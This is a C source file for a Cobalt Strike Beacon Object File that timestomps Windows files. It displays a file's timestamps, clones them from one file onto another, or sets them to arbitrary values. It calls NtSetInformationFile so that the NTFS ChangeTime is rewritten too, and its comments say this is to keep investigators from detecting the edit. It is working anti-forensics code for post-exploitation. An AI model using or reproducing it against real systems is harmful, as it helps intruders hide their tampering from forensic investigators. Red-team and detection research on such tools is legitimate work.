#include <windows.h>
#include "../../RemoteOps/CS-Remote-OPs-BOF/src/common/bofdefs.h"
#include "../../RemoteOps/CS-Remote-OPs-BOF/src/common/base.c"

/* Timestomp BOF — rewrite a file's MAC times.
 *
 * Uses NtSetInformationFile(FileBasicInformation) so the MFT ChangeTime is
 * also rewritten (the classic timestomp trick), falling back to
 * kernel32 SetFileTime if the Nt path is unavailable.
 *
 * Modes (unpacked from the Beacon packer):
 *   0 = display file's Creation/Access/Write times (arg: file)
 *   1 = clone SOURCE file's times onto TARGET file (args: source, target)
 *   2 = set target's C/A/W to an explicit FILETIME (arg: target + 3x u64)
 */

/* kernel32 FileTime APIs not declared by the vendored bofdefs.h */
WINBASEAPI BOOL WINAPI KERNEL32$GetFileTime(HANDLE hFile, LPFILETIME lpCreationTime,
                                            LPFILETIME lpLastAccessTime, LPFILETIME lpLastWriteTime);
WINBASEAPI BOOL WINAPI KERNEL32$SetFileTime(HANDLE hFile, const FILETIME* lpCreationTime,
                                            const FILETIME* lpLastAccessTime, const FILETIME* lpLastWriteTime);
WINBASEAPI BOOL WINAPI KERNEL32$FileTimeToLocalFileTime(const FILETIME* lpFileTime, LPFILETIME lpLocalFileTime);

/* ntdll NtSetInformationFile (declared in winternl.h, imported via $ split) */
WINBASEAPI NTSTATUS NTAPI NTDLL$NtSetInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock,
                                                     PVOID FileInformation, ULONG Length,
                                                     FILE_INFORMATION_CLASS FileInformationClass);

#define MODE_DISPLAY 0
#define MODE_CLONE   1
#define MODE_SET     2

/* base.c calls memcpy/memset bare; under -fno-builtin the compiler leaves
 * undefined references that the BOF loader can't resolve. Route them through
 * MSVCRT like the other modules. */
void *memcpy(void *dest, const void *src, size_t n) { return MSVCRT$memcpy(dest, src, n); }
void *memset(void *s, int c, size_t n)              { MSVCRT$memset(s, c, n); return s; }

static void ShowTime(const char* label, const FILETIME* ft)
{
    FILETIME local;
    SYSTEMTIME st;
    if (!KERNEL32$FileTimeToLocalFileTime(ft, &local) ||
        !KERNEL32$FileTimeToSystemTime(&local, &st))
    {
        internal_printf("    %-12s: (invalid)\n", label);
        return;
    }
    internal_printf("    %-12s: %04u-%02u-%02u %02u:%02u:%02u\n",
                    label, st.wYear, st.wMonth, st.wDay,
                    st.wHour, st.wMinute, st.wSecond);
}

/* Read a handle's MAC times and print them with an indented block label. */
static void DumpTimes(const char* title, HANDLE h)
{
    FILETIME ftC, ftA, ftW;
    if (KERNEL32$GetFileTime(h, &ftC, &ftA, &ftW))
    {
        internal_printf("%s\n", title);
        ShowTime("Creation", &ftC);
        ShowTime("Access",   &ftA);
        ShowTime("Write",    &ftW);
    }
    else
    {
        internal_printf("%s (unreadable, WinErr=%lu)\n", title, KERNEL32$GetLastError());
    }
}

/* Open an existing file for attribute read/write, sharing it with other
 * handles so in-use/locked files can still be timestomped. */
static HANDLE OpenTarget(const char* path, DWORD access)
{
    return KERNEL32$CreateFileA(path, access,
                                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

static void SetTimes(HANDLE hFile, const FILETIME* create, const FILETIME* access, const FILETIME* write)
{
    /* Rewrite all four MFT timestamps atomically. ChangeTime is set to the
     * LastWriteTime so the "entry modified" stamp can't betray the edit. */
    FILE_BASIC_INFORMATION fbi;
    IO_STATUS_BLOCK iosb;
    NTSTATUS st;

    MSVCRT$memset(&fbi, 0, sizeof(fbi));
    MSVCRT$memset(&iosb, 0, sizeof(iosb));

    fbi.CreationTime.QuadPart   = create ? ((PLARGE_INTEGER)create)->QuadPart : 0;
    fbi.LastAccessTime.QuadPart = access ? ((PLARGE_INTEGER)access)->QuadPart : 0;
    fbi.LastWriteTime.QuadPart  = write  ? ((PLARGE_INTEGER)write)->QuadPart  : 0;
    fbi.ChangeTime.QuadPart     = write  ? ((PLARGE_INTEGER)write)->QuadPart  : 0;

    st = NTDLL$NtSetInformationFile(hFile, &iosb, &fbi, sizeof(fbi), FileBasicInformation);
    if (st == 0)
    {
        internal_printf("[+] Timestamps set (NtSetInformationFile)\n");
        return;
    }

    /* Fallback: SetFileTime rewrites C/A/W but leaves ChangeTime. */
    if (KERNEL32$SetFileTime(hFile, create, access, write))
    {
        internal_printf("[+] Timestamps set (SetFileTime; ChangeTime untouched)\n");
        return;
    }

    internal_printf("[-] Failed to set timestamps (NtStatus=0x%08lx, WinErr=%lu)\n",
                    (unsigned long)st, KERNEL32$GetLastError());
}

void go(char* args, int len)
{
    datap parser;
    int   mode;

    bofstart();
    BeaconDataParse(&parser, args, len);

    mode = BeaconDataInt(&parser);

    if (mode == MODE_DISPLAY)
    {
        char* target = BeaconDataExtract(&parser, NULL);
        FILETIME ftC, ftA, ftW;
        HANDLE h;

        if (!target || target[0] == '\0')
        {
            internal_printf("[-] No file path supplied\n");
            printoutput(TRUE);
            return;
        }

        h = OpenTarget(target, GENERIC_READ);
        if (h == INVALID_HANDLE_VALUE || h == NULL)
        {
            internal_printf("[-] Cannot open '%s' (WinErr=%lu)\n", target, KERNEL32$GetLastError());
            printoutput(TRUE);
            return;
        }
        if (KERNEL32$GetFileTime(h, &ftC, &ftA, &ftW))
        {
            internal_printf("[*] Timestamps for '%s' (local time):\n", target);
            ShowTime("Creation",  &ftC);
            ShowTime("Access",    &ftA);
            ShowTime("Write",     &ftW);
        }
        else
        {
            internal_printf("[-] GetFileTime failed (WinErr=%lu)\n", KERNEL32$GetLastError());
        }
        KERNEL32$CloseHandle(h);
    }
    else if (mode == MODE_CLONE)
    {
        /* arg order: <source/original> <target/to-modify> */
        char* source = BeaconDataExtract(&parser, NULL);
        char* target = BeaconDataExtract(&parser, NULL);
        FILETIME ftC, ftA, ftW;
        HANDLE hsrc, htarget;

        if (!source || source[0] == '\0')
        {
            internal_printf("[-] No source (original) path supplied\n");
            printoutput(TRUE);
            return;
        }
        if (!target || target[0] == '\0')
        {
            internal_printf("[-] No target path supplied\n");
            printoutput(TRUE);
            return;
        }

        hsrc = OpenTarget(source, GENERIC_READ);
        if (hsrc == INVALID_HANDLE_VALUE || hsrc == NULL)
        {
            internal_printf("[-] Cannot open source '%s' (WinErr=%lu)\n",
                            source, KERNEL32$GetLastError());
            printoutput(TRUE);
            return;
        }
        if (!KERNEL32$GetFileTime(hsrc, &ftC, &ftA, &ftW))
        {
            internal_printf("[-] Cannot read source timestamps (WinErr=%lu)\n",
                            KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hsrc);
            printoutput(TRUE);
            return;
        }
        KERNEL32$CloseHandle(hsrc);

        htarget = OpenTarget(target, GENERIC_READ | GENERIC_WRITE);
        if (htarget == INVALID_HANDLE_VALUE || htarget == NULL)
        {
            internal_printf("[-] Cannot open target '%s' (WinErr=%lu)\n",
                            target, KERNEL32$GetLastError());
            printoutput(TRUE);
            return;
        }

        internal_printf("[*] Timestomp (clone)\n");
        internal_printf("  Source (original) : %s\n", source);
        internal_printf("  Source timestamps:\n");
        ShowTime("Creation", &ftC);
        ShowTime("Access",   &ftA);
        ShowTime("Write",    &ftW);

        internal_printf("  Target (to modify): %s\n", target);
        DumpTimes("  Target BEFORE:", htarget);

        SetTimes(htarget, &ftC, &ftA, &ftW);

        DumpTimes("  Target AFTER :", htarget);
        KERNEL32$CloseHandle(htarget);
    }
    else if (mode == MODE_SET)
    {
        char* target = BeaconDataExtract(&parser, NULL);
        FILETIME ftC, ftA, ftW;
        HANDLE h;

        if (!target || target[0] == '\0')
        {
            internal_printf("[-] No target path supplied\n");
            printoutput(TRUE);
            return;
        }

        ftC.dwLowDateTime  = (DWORD)BeaconDataInt(&parser);
        ftC.dwHighDateTime = (DWORD)BeaconDataInt(&parser);
        ftA.dwLowDateTime  = (DWORD)BeaconDataInt(&parser);
        ftA.dwHighDateTime = (DWORD)BeaconDataInt(&parser);
        ftW.dwLowDateTime  = (DWORD)BeaconDataInt(&parser);
        ftW.dwHighDateTime = (DWORD)BeaconDataInt(&parser);

        h = OpenTarget(target, GENERIC_READ | GENERIC_WRITE);
        if (h == INVALID_HANDLE_VALUE || h == NULL)
        {
            internal_printf("[-] Cannot open target '%s' (WinErr=%lu)\n",
                            target, KERNEL32$GetLastError());
            printoutput(TRUE);
            return;
        }

        internal_printf("[*] Setting MAC times on '%s'\n", target);
        SetTimes(h, &ftC, &ftA, &ftW);
        KERNEL32$CloseHandle(h);
    }
    else
    {
        internal_printf("[-] Unknown mode %d\n", mode);
    }

    printoutput(TRUE);
}
